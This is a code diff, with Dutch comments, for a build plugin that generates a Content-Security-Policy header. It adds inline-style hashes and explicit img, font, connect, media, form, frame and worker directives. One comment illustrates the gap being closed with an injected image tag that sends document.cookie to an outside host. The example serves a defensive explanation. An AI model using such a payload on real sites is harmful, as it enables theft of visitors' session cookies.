@@ -71,6 +71,15 @@ import { fileURLToPath } from 'node:url';
 /** De hosts die een script mogen leveren, buiten de site zelf. */
 export const SCRIPT_HOSTS = ['https://static.cloudflareinsights.com'];
 
+/*
+ * De host waar de Cloudflare-beacon zijn meting naartoe stuurt. Dat is een
+ * ANDERE host dan waar het script vandaan komt — het script staat op
+ * static.cloudflareinsights.com, de POST gaat naar cloudflareinsights.com
+ * /cdn-cgi/rum. Wie alleen de scripthost in connect-src zet, blokkeert de
+ * meting en ziet daar niets van, want de beacon slikt zijn eigen fout.
+ */
+export const CONNECT_HOSTS = ['https://cloudflareinsights.com'];
+
 /** De regel waarop de header in dist/_headers wordt vervangen. */
 const CSP_REGEL = /^(\s*)Content-Security-Policy:.*$/m;
 
@@ -82,6 +91,27 @@ const CSP_REGEL = /^(\s*)Content-Security-Policy:.*$/m;
  * regeleindes. Vandaar geen trim() en geen normalisatie: elke opschoning hier is
  * een hash die niet meer klopt.
  */
+/**
+ * Elke <style> die in de pagina is BLIJVEN staan.
+ *
+ * scripts/stijl-uit-de-pagina.mjs haalt ze er normaal uit, met één uitzondering
+ * die ertoe doet: een <style> binnen <noscript>. Daar IS de plek de voorwaarde —
+ * verhuizen betekent hem altijd laten gelden, en dat heeft één keer de
+ * before/after-slider gesloopt (zie de kop van die stap). Zo'n blok blijft dus
+ * staan, en dan heeft `style-src 'self'` een hash nodig.
+ *
+ * Net als bij de scripts wordt er gehasht wat er WERKELIJK in de build staat, en
+ * niet wat iemand hier heeft ingetypt: verandert die regel, dan verandert de hash
+ * mee zonder dat er aan gedacht hoeft te worden.
+ */
+export function inlineStyleHashes(html) {
+  const uit = new Set();
+  for (const m of html.matchAll(/<style([^>]*)>([\s\S]*?)<\/style>/g)) {
+    uit.add(`'sha256-${createHash('sha256').update(m[2], 'utf8').digest('base64')}'`);
+  }
+  return uit;
+}
+
 export function inlineScriptHashes(html) {
   const uit = new Set();
   for (const m of html.matchAll(/<script([^>]*)>([\s\S]*?)<\/script>/g)) {
@@ -95,7 +125,7 @@ export function inlineScriptHashes(html) {
 }
 
 /** De volledige headerwaarde, uit een verzameling hashes. */
-export function cspWaarde(hashes) {
+export function cspWaarde(hashes, stijlHashes = []) {
   return [
     "frame-ancestors 'none'",
     "object-src 'none'",
@@ -110,17 +140,65 @@ export function cspWaarde(hashes) {
      * terug op deze regel en is het dus geblokkeerd, en dat is precies wat we
      * willen: gebeurt het toch weer, dan valt het meteen op in plaats van stil
      * door een ruimere -attr te worden toegelaten.
+     *
+     * DE HASHES ZIJN VOOR WAT ER MOEST BLIJVEN STAAN. Eén <style> zit in een
+     * <noscript> en kan daar niet weg: daar is de PLEK de voorwaarde. Zie
+     * inlineStyleHashes() hierboven.
      */
-    "style-src 'self'",
+    ['style-src', "'self'", ...[...(stijlHashes || [])].sort()].join(' '),
     ['script-src', "'self'", ...SCRIPT_HOSTS, ...[...hashes].sort()].join(' '),
+    /* ── DE REST VAN DE DEUREN, GEMETEN EN NIET GEGOKT ────────────────────────
+     *
+     * script-src en style-src stonden er al; alles wat GEEN script en geen stijl
+     * is, viel tot nu toe nergens onder — er is geen default-src, dus img, font,
+     * fetch en formulierdoel waren onbeperkt. Dat is precies het gat waar een
+     * geïnjecteerde <img src="https://…/?c=" + document.cookie> doorheen loopt:
+     * geen script nodig, en de CSP kijkt er niet naar.
+     *
+     * Elke waarde hieronder is aan de BUILD gemeten, niet uit het hoofd:
+     *
+     *   img-src   'self' data: — 651 verwijzingen naar visuails.com zelf, en in
+     *             de stylesheets drie data:image/svg+xml-achtergronden (de ruis-
+     *             filter en twee chevrons). Geen enkele externe afbeelding.
+     *   font-src  'self' — alle woff2 staan onder /_astro/. Geen Google Fonts,
+     *             geen Typekit; als er ooit één bij komt, valt hij hier om en
+     *             dat is de bedoeling.
+     *   connect-src — elke fetch en XHR in src/scripts/ gaat naar /api/… of
+     *             /account/… op de eigen origin. Daarbuiten alleen de beacon.
+     *   media-src 'self' — VideoExamples.astro zet <source src> op eigen
+     *             bestanden. Vandaag staat er nog geen clip in de build; de
+     *             regel staat er wél, zodat de eerste clip niet stilvalt.
+     *   form-action 'self' — de 204 formulieren in de build posten naar
+     *             /account/logout, /api/order en /account/plan/start. Een
+     *             betaling verlaat de site via een SERVER-redirect en niet via
+     *             een formulier, dus Mollie hoort hier niet.
+     *   frame-src 'none' — er staat geen enkele iframe in de build.
+     *   worker-src 'none' — geen Worker, geen serviceWorker.
+     *
+     * GEEN default-src. Die zou al deze regels overbodig lijken maken en is
+     * juist gevaarlijker: hij dekt ook richtlijnen die we niet overwogen hebben
+     * met een waarde die we niet voor die richtlijn gekozen hebben. Liever een
+     * lijst die zegt wat hij dekt, en die omvalt bij het eerste nieuwe soort
+     * verzoek — dan staan we ervoor in plaats van dat het stil goed gaat.
+     */
+    "img-src 'self' data:",
+    "font-src 'self'",
+    ['connect-src', "'self'", ...CONNECT_HOSTS].join(' '),
+    "media-src 'self'",
+    "form-action 'self'",
+    "frame-src 'none'",
+    "worker-src 'none'",
   ].join('; ');
 }
 
 export async function schrijfCsp(distDir) {
   const paginas = globSync(join(distDir, '**/*.html').replace(/\\/g, '/'));
   const hashes = new Set();
+  const stijl = new Set();
   for (const p of paginas) {
-    for (const h of inlineScriptHashes(await readFile(p, 'utf8'))) hashes.add(h);
+    const html = await readFile(p, 'utf8');
+    for (const h of inlineScriptHashes(html)) hashes.add(h);
+    for (const h of inlineStyleHashes(html)) stijl.add(h);
   }
 
   const pad = join(distDir, '_headers');
@@ -131,13 +209,13 @@ export async function schrijfCsp(distDir) {
     /* Geen _headers in de build betekent dat public/_headers is weggehaald. Dan is
        er meer aan de hand dan een ontbrekende CSP, en stil een nieuw bestand
        aanmaken zou dat verstoppen. */
-    return { paginas: paginas.length, hashes: hashes.size, geschreven: false };
+    return { paginas: paginas.length, hashes: hashes.size, stijl: stijl.size, geschreven: false };
   }
   if (!CSP_REGEL.test(tekst)) {
-    return { paginas: paginas.length, hashes: hashes.size, geschreven: false };
+    return { paginas: paginas.length, hashes: hashes.size, stijl: stijl.size, geschreven: false };
   }
-  await writeFile(pad, tekst.replace(CSP_REGEL, `$1Content-Security-Policy: ${cspWaarde(hashes)}`), 'utf8');
-  return { paginas: paginas.length, hashes: hashes.size, geschreven: true };
+  await writeFile(pad, tekst.replace(CSP_REGEL, `$1Content-Security-Policy: ${cspWaarde(hashes, stijl)}`), 'utf8');
+  return { paginas: paginas.length, hashes: hashes.size, stijl: stijl.size, geschreven: true };
 }
 
 export default function cspScripts() {
@@ -156,7 +234,7 @@ export default function cspScripts() {
           logger.warn('csp: geen Content-Security-Policy-regel in dist/_headers gevonden — header NIET geschreven');
           return;
         }
-        logger.info(`csp: script-src met ${uit.hashes} hash(es) uit ${uit.paginas} pagina's`);
+        logger.info(`csp: script-src met ${uit.hashes} hash(es), style-src met ${uit.stijl}, uit ${uit.paginas} pagina's`);
       },
     },
   };
